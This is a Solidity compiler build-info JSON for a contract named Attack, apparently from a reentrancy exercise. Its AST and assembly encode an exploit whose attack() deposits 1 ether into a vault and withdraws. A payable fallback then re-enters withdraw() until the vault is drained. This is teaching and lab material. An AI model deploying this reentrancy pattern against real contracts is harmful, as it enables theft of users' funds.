											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 442,
											"end": 458,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 442,
											"end": 458,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 320,
											"end": 464,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										}
									]
								}
							},
							"sourceList": [
								"contracts/my_contract_calyptus/Reentrancy/Attack.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.24+commit.e11b9ed9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_vaultAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":\"Attack\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":{\"keccak256\":\"0xc55582f360e9d5542793c6a7a911e3ef84de72b1f886e3a17e64425c6d8286f9\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d0c3c916adde9a2050506e5f86847f5913ca2a36be975157596f768c0cc27c0a\",\"dweb:/ipfs/QmU9RCwnUJjAR3bA3iNWgBvEeR9gz4a5xfcAFBWVaR33QY\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 10,
								"contract": "contracts/my_contract_calyptus/Reentrancy/Attack.sol:Attack",
								"label": "vaultAddress",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 26,
								"contract": "contracts/my_contract_calyptus/Reentrancy/Attack.sol:Attack",
								"label": "vault",
								"offset": 0,
								"slot": "1",
								"type": "t_contract(IVault)8"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_contract(IVault)8": {
								"encoding": "inplace",
								"label": "contract IVault",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"IVault": {
					"abi": [
						{
							"inputs": [],
							"name": "deposit",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdraw",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"deposit()": "d0e30db0",
							"withdraw()": "3ccfd60b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.24+commit.e11b9ed9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":\"IVault\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":{\"keccak256\":\"0xc55582f360e9d5542793c6a7a911e3ef84de72b1f886e3a17e64425c6d8286f9\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d0c3c916adde9a2050506e5f86847f5913ca2a36be975157596f768c0cc27c0a\",\"dweb:/ipfs/QmU9RCwnUJjAR3bA3iNWgBvEeR9gz4a5xfcAFBWVaR33QY\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "3628",
				"formattedMessage": "Warning: This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.\n --> contracts/my_contract_calyptus/Reentrancy/Attack.sol:9:1:\n  |\n9 | contract Attack {\n  | ^ (Relevant source part starts here and spans across multiple lines).\nNote: The payable fallback function is defined here.\n  --> contracts/my_contract_calyptus/Reentrancy/Attack.sol:22:4:\n   |\n22 |    fallback() external payable {\n   |    ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.",
				"secondarySourceLocations": [
					{
						"end": 593,
						"file": "contracts/my_contract_calyptus/Reentrancy/Attack.sol",
						"message": "The payable fallback function is defined here.",
						"start": 473
					}
				],
				"severity": "warning",
				"sourceLocation": {
					"end": 595,
					"file": "contracts/my_contract_calyptus/Reentrancy/Attack.sol",
					"start": 153
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/my_contract_calyptus/Reentrancy/Attack.sol": {
				"ast": {
					"absolutePath": "contracts/my_contract_calyptus/Reentrancy/Attack.sol",
					"exportedSymbols": {
						"Attack": [
							68
						],
						"IVault": [
							8
						]
					},
					"id": 69,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IVault",
							"contractDependencies": [],
							"contractKind": "interface",
							"fullyImplemented": false,
							"id": 8,
							"linearizedBaseContracts": [
								8
							],
							"name": "IVault",
							"nameLocation": "68:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"functionSelector": "d0e30db0",
									"id": 4,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "deposit",
									"nameLocation": "88:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "95:2:0"
									},
									"returnParameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "114:0:0"
									},
									"scope": 8,
									"src": "79:36:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "3ccfd60b",
									"id": 7,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "withdraw",
									"nameLocation": "128:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "136:2:0"
									},
									"returnParameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "147:0:0"
									},
									"scope": 8,
									"src": "119:29:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 69,
							"src": "58:92:0",
							"usedErrors": [],
							"usedEvents": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Attack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 68,
							"linearizedBaseContracts": [
								68
							],
							"name": "Attack",
							"nameLocation": "162:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 10,
									"mutability": "mutable",
									"name": "vaultAddress",
									"nameLocation": "182:12:0",
									"nodeType": "VariableDeclaration",
									"scope": 68,
									"src": "174:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 9,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "174:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 19,
										"nodeType": "Block",
										"src": "233:43:0",
										"statements": [
											{
												"expression": {
													"id": 17,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 15,
														"name": "vaultAddress",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 10,
														"src": "241:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 16,
														"name": "_vaultAddress",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 12,
														"src": "257:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "241:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 18,
												"nodeType": "ExpressionStatement",
												"src": "241:29:0"
											}
										]
									},
									"id": 20,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 12,
												"mutability": "mutable",
												"name": "_vaultAddress",
												"nameLocation": "219:13:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "211:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 11,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "211:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "210:23:0"
									},
									"returnParameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "233:0:0"
									},
									"scope": 68,
									"src": "199:77:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 26,
									"mutability": "mutable",
									"name": "vault",
									"nameLocation": "287:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 68,
									"src": "280:35:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_IVault_$8",
										"typeString": "contract IVault"
									},
									"typeName": {
										"id": 22,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 21,
											"name": "IVault",
											"nameLocations": [
												"280:6:0"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 8,
											"src": "280:6:0"
										},
										"referencedDeclaration": 8,
										"src": "280:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IVault_$8",
											"typeString": "contract IVault"
										}
									},
									"value": {
										"arguments": [
											{
												"id": 24,
												"name": "vaultAddress",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 10,
												"src": "302:12:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											],
											"id": 23,
											"name": "IVault",
											"nodeType": "Identifier",
											"overloadedDeclarations": [],
											"referencedDeclaration": 8,
											"src": "295:6:0",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_contract$_IVault_$8_$",
												"typeString": "type(contract IVault)"
											}
										},
										"id": 25,
										"isConstant": false,
										"isLValue": false,
										"isPure": false,
										"kind": "typeConversion",
										"lValueRequested": false,
										"nameLocations": [],
										"names": [],
										"nodeType": "FunctionCall",
										"src": "295:20:0",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IVault_$8",
											"typeString": "contract IVault"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 48,
										"nodeType": "Block",
										"src": "355:109:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 33,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 30,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "372:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 31,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "376:5:0",
																"memberName": "value",
																"nodeType": "MemberAccess",
																"src": "372:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"hexValue": "31",
																"id": 32,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "385:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															},
															"src": "372:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 29,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "364:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 34,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "364:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 35,
												"nodeType": "ExpressionStatement",
												"src": "364:29:0"
											},
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": [],
															"expression": {
																"id": 36,
																"name": "vault",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 26,
																"src": "402:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IVault_$8",
																	"typeString": "contract IVault"
																}
															},
															"id": 38,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "408:7:0",
															"memberName": "deposit",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 4,
															"src": "402:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_payable$__$returns$__$",
																"typeString": "function () payable external"
															}
														},
														"id": 40,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"hexValue": "31",
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "423:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															}
														],
														"src": "402:29:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_payable$__$returns$__$value",
															"typeString": "function () payable external"
														}
													},
													"id": 41,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "402:31:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 42,
												"nodeType": "ExpressionStatement",
												"src": "402:31:0"
											},
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"id": 43,
															"name": "vault",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 26,
															"src": "442:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IVault_$8",
																"typeString": "contract IVault"
															}
														},
														"id": 45,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "448:8:0",
														"memberName": "withdraw",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 7,
														"src": "442:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
															"typeString": "function () external"
														}
													},
													"id": 46,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "442:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 47,
												"nodeType": "ExpressionStatement",
												"src": "442:16:0"
											}
										]
									},
									"functionSelector": "9e5faafc",
									"id": 49,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nameLocation": "329:6:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 27,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "335:2:0"
									},
									"returnParameters": {
										"id": 28,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "355:0:0"
									},
									"scope": 68,
									"src": "320:144:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 66,
										"nodeType": "Block",
										"src": "501:92:0",
										"statements": [
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"expression": {
															"arguments": [
																{
																	"id": 54,
																	"name": "vault",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 26,
																	"src": "522:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IVault_$8",
																		"typeString": "contract IVault"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_IVault_$8",
																		"typeString": "contract IVault"
																	}
																],
																"id": 53,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "514:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 52,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "514:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 55,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "514:14:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 56,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "529:7:0",
														"memberName": "balance",
														"nodeType": "MemberAccess",
														"src": "514:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"hexValue": "31",
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "540:7:0",
														"subdenomination": "ether",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1000000000000000000_by_1",
															"typeString": "int_const 1000000000000000000"
														},
														"value": "1"
													},
													"src": "514:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 65,
												"nodeType": "IfStatement",
												"src": "510:78:0",
												"trueBody": {
													"id": 64,
													"nodeType": "Block",
													"src": "549:39:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"expression": {
																		"id": 59,
																		"name": "vault",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 26,
																		"src": "562:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IVault_$8",
																			"typeString": "contract IVault"
																		}
																	},
																	"id": 61,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberLocation": "568:8:0",
																	"memberName": "withdraw",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 7,
																	"src": "562:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
																		"typeString": "function () external"
																	}
																},
																"id": 62,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "562:16:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 63,
															"nodeType": "ExpressionStatement",
															"src": "562:16:0"
														}
													]
												}
											}
										]
									},
									"id": 67,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "481:2:0"
									},
									"returnParameters": {
										"id": 51,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "501:0:0"
									},
									"scope": 68,
									"src": "473:120:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 69,
							"src": "153:442:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:563:0"
				},
				"id": 0
			}
		}
	}
}